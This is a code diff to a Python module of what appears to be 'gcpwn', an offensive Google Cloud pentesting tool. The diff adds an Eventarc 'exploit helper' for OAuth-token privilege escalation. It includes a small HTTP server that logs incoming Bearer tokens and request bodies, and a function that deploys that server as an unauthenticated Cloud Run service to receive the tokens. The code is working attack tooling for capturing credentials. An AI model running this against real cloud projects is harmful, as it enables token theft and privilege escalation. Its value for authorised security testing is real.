@@ -1,12 +1,42 @@
 from __future__ import annotations
 
+import subprocess
+import time
 from typing import Any
 
+import requests as _rlib
+
+from gcpwn.core.console import UtilityTools
 from gcpwn.core.resource import GcpListResource
 from gcpwn.core.utils.module_helpers import (
     extract_path_segment,
     region_resolver_for,
 )
+
+_EVENTARC = "https://eventarc.googleapis.com/v1"
+_PUBSUB = "https://pubsub.googleapis.com/v1"
+
+_CAPTURE_IMAGE = "python:3.11-alpine"
+_CAPTURE_APP = """\
+import os
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class H(BaseHTTPRequestHandler):
+    def do_POST(self):
+        auth_header = self.headers.get('Authorization', '')
+        token = auth_header.removeprefix('Bearer ').strip()
+        length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(length) if length else b''
+        print(f'GCPWN_EVENTARC_TOKEN={token}', flush=True)
+        print(f'GCPWN_EVENTARC_BODY={body[:200]}', flush=True)
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'captured')
+    def log_message(self, *a): pass
+
+port = int(os.environ.get('PORT', 8080))
+HTTPServer(('', port), H).serve_forever()
+"""
 
 
 def _eventarc():
@@ -108,6 +138,76 @@ def _event_filters_summary(raw: dict[str, Any]) -> str:
         else:
             parts.append(f"{attribute}={value}")
     return ", ".join(parts)
+
+
+class EventarcPipelinesResource:
+    """Exploit helper for Eventarc pipeline oauthToken PE."""
+
+    def __init__(self, session):
+        self.session = session
+
+    @staticmethod
+    def req(tok: str, method: str, url: str, body=None, params=None):
+        hdrs = {"Authorization": f"Bearer {tok}", "Content-Type": "application/json"}
+        fn = {"GET": _rlib.get, "POST": _rlib.post, "PUT": _rlib.put,
+              "PATCH": _rlib.patch, "DELETE": _rlib.delete}[method]
+        r = fn(url, headers=hdrs, json=body, params=params, timeout=30)
+        try:
+            return r.status_code, r.json()
+        except Exception:
+            return r.status_code, {"_raw": r.text[:600]}
+
+    @staticmethod
+    def lro_wait(tok: str, lro: str, timeout: int = 120) -> dict | None:
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            time.sleep(8)
+            hdrs = {"Authorization": f"Bearer {tok}"}
+            r = _rlib.get(f"{_EVENTARC}/{lro}", headers=hdrs, timeout=30)
+            try:
+                data = r.json()
+            except Exception:
+                continue
+            if r.status_code == 200 and data.get("done"):
+                return data
+        return None
+
+    @staticmethod
+    def deploy_capture_service(project: str, region: str):
+        """Deploy a Cloud Run capture service; returns (url, svc_name) or (None, None)."""
+        import pathlib
+        import tempfile
+        tmpdir = pathlib.Path(tempfile.mkdtemp(prefix="gcpwn-eventarc-capture-"))
+        (tmpdir / "main.py").write_text(_CAPTURE_APP)
+        (tmpdir / "Dockerfile").write_text(
+            "FROM python:3.11-alpine\n"
+            "WORKDIR /app\n"
+            "COPY main.py .\n"
+            "CMD [\"python\", \"main.py\"]\n"
+        )
+        svc_name = f"gcpwn-ea-capture-{int(time.time()) % 100000}"
+        print(f"  Deploying Cloud Run capture service '{svc_name}' in {region}…")
+        cmd = [
+            "gcloud", "run", "deploy", svc_name,
+            "--source", str(tmpdir),
+            "--region", region,
+            "--project", project,
+            "--allow-unauthenticated",
+            "--max-instances", "1",
+            "--quiet",
+            "--format", "value(status.url)",
+        ]
+        try:
+            out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=300, text=True)
+            url = out.strip()
+            print(f"  {UtilityTools.GREEN}Capture URL: {url}{UtilityTools.RESET}")
+            return url, svc_name
+        except subprocess.CalledProcessError:
+            print(f"  {UtilityTools.RED}gcloud run deploy failed. Try building manually and pass --capture-url.{UtilityTools.RESET}")
+            return None, None
+        except FileNotFoundError:
+            print(f"  {UtilityTools.RED}gcloud not found. Pass --capture-url with an existing Cloud Run service.{UtilityTools.RESET}")
+            return None, None
 
 
 class EventarcTriggersResource(GcpListResource):
